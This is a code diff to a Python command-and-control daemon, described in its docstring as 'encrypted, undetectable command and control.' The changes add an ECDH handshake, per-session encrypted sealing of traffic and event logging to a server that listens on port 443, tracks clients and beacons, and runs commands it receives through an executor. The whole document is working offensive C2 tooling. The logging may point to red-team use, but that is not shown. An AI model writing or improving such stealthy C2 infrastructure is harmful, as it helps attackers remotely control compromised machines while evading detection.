@@ -15,8 +15,10 @@ import threading
 import time
 from typing import Any, Callable, Dict, List, Optional
 
+from c2.handshake import HandshakeError, HandshakeServer, Session
 from core.crypto import Crypto
 from core.executor import Executor
+from core.warlog import LogLevel, WarLog
 
 logger = logging.getLogger("void.c2.daemon")
 
@@ -25,11 +27,17 @@ class C2Daemon:
     """Custom C2 daemon — encrypted, undetectable command and control."""
 
     def __init__(self, host: str = "0.0.0.0", port: int = 443,
-                 crypto: Optional[Crypto] = None, executor: Optional[Executor] = None):
+                 crypto: Optional[Crypto] = None, executor: Optional[Executor] = None,
+                 warlog: Optional[WarLog] = None, require_handshake: bool = True):
         self.host = host
         self.port = port
         self.crypto = crypto or Crypto()
         self.executor = executor or Executor()
+        self.warlog = warlog if warlog is not None else WarLog()
+        # Fail closed: clients must complete the ECDH handshake before any
+        # command traffic is accepted. Operators may disable explicitly.
+        self.require_handshake = require_handshake
+        self.handshake = HandshakeServer(crypto=self.crypto)
         self.clients: Dict[str, Dict[str, Any]] = {}
         self.beacons: Dict[str, Dict[str, Any]] = {}
         self.command_queue: List[Dict[str, Any]] = []
@@ -100,25 +108,112 @@ class C2Daemon:
         """
         logger.info(f"New connection from {addr}")
         client_id = f"{addr[0]}:{addr[1]}"
+        try:
+            data = client_socket.recv(65536)
+            if not data:
+                client_socket.close()
+                return
+            payload = json.loads(self.crypto.decrypt(data.decode()))
+
+            # Encrypted channel: handshake first (fail closed), then commands.
+            if payload.get("type") == "handshake_hello":
+                self._do_handshake(client_socket, addr, payload)
+                return
+
+            session = self._resolve_session(payload)
+            if self.require_handshake and session is None:
+                logger.warning(
+                    "Unauthenticated command from %s refused (handshake required)",
+                    client_id,
+                )
+                self._evidence(
+                    "c2.handshake_required", LogLevel.C2,
+                    target=client_id,
+                    data={"reason": "command before handshake"},
+                )
+                client_socket.close()
+                return
+
+            if session is not None:
+                # Session traffic is sealed under the per-session key.
+                inner = session.open_json(payload["sealed"])
+                response = self._process_command(inner)
+                out = session.seal_json(response)
+            else:
+                # Legacy plaintext-command path (require_handshake disabled).
+                response = self._process_command(payload)
+                out = self.crypto.encrypt(json.dumps(response))
+            client_socket.send(out.encode())
+        except Exception as e:
+            logger.error(f"Error handling client {client_id}: {e}")
+        finally:
+            client_socket.close()
+
+    def _do_handshake(self, client_socket: socket.socket, addr: tuple,
+                      hello: Dict[str, Any]) -> None:
+        """Run the ECDH handshake and register the resulting session."""
+        client_id = f"{addr[0]}:{addr[1]}"
+        try:
+            reply, state = self.handshake.process_hello(hello)
+        except HandshakeError as e:
+            logger.warning(f"Handshake rejected from {client_id}: {e}")
+            self._evidence(
+                "c2.handshake_rejected", LogLevel.C2,
+                target=client_id,
+                data={"client_id": str(hello.get("client_id", "")), "reason": str(e)},
+            )
+            client_socket.close()
+            return
+
+        client_socket.send(self.crypto.encrypt(json.dumps(reply)).encode())
+        data2 = client_socket.recv(65536)
+        confirm_payload = json.loads(self.crypto.decrypt(data2.decode()))
+        try:
+            session = self.handshake.confirm(state, confirm_payload)
+        except HandshakeError as e:
+            logger.warning(f"Handshake confirm rejected from {client_id}: {e}")
+            self._evidence(
+                "c2.handshake_rejected", LogLevel.C2,
+                target=client_id,
+                data={"client_id": str(state.get("client_id", "")), "reason": str(e)},
+            )
+            client_socket.close()
+            return
+
         self.clients[client_id] = {
             "socket": client_socket,
             "address": addr,
             "connected_at": time.time(),
             "last_checkin": time.time(),
+            "session": session,
         }
+        self._evidence(
+            "c2.handshake_ok", LogLevel.C2,
+            target=client_id,
+            data=session.evidence(),
+        )
+        ack = session.seal_json({"type": "handshake_ok", "session": session.evidence()})
+        client_socket.send(ack.encode())
+
+    def _resolve_session(self, payload: Dict[str, Any]) -> Optional[Session]:
+        """Return the Session for a sealed session payload, else None."""
+        session_id = payload.get("session", "")
+        if not session_id or "sealed" not in payload:
+            return None
+        for client in self.clients.values():
+            session = client.get("session")
+            if session is not None and session.client_id == session_id:
+                return session
+        return None
+
+    def _evidence(self, message: str, level: LogLevel, target: str,
+                  data: Optional[Dict[str, Any]] = None) -> None:
+        """Write WarLog evidence for a C2 event (never key material)."""
         try:
-            data = client_socket.recv(4096)
-            if data:
-                decrypted = self.crypto.decrypt(data.decode())
-                if decrypted:
-                    payload = json.loads(decrypted)
-                    response = self._process_command(payload)
-                    encrypted_response = self.crypto.encrypt(json.dumps(response))
-                    client_socket.send(encrypted_response.encode())
-        except Exception as e:
-            logger.error(f"Error handling client {client_id}: {e}")
-        finally:
-            client_socket.close()
+            self.warlog.log(message, level=level, module="c2.daemon",
+                            target=target, data=data)
+        except Exception:
+            logger.exception("WarLog write failed for C2 event %s", message)
 
     def _process_command(self, payload: Dict[str, Any]) -> Dict[str, Any]:
         """Process a command from a client.
@@ -139,7 +234,8 @@ class C2Daemon:
             except Exception as e:
                 return {"success": False, "error": str(e), "timestamp": time.time()}
 
-        # Default handler: execute the command
+        # Default handler: execute the command (argv-first; Executor.run_command
+        # is a safe alias of Executor.run — no shell interpolation of input).
         result = self.executor.run_command(command, timeout=payload.get("timeout", 30))
         return {
             "success": result.success,
@@ -225,7 +321,11 @@ class C2Daemon:
 
         try:
             client = self.clients[client_id]
-            encrypted = self.crypto.encrypt(json.dumps(payload))
+            session = client.get("session")
+            if session is not None:
+                encrypted = session.seal_json(payload)
+            else:
+                encrypted = self.crypto.encrypt(json.dumps(payload))
             client["socket"].send(encrypted.encode())
             return True
         except Exception as e:
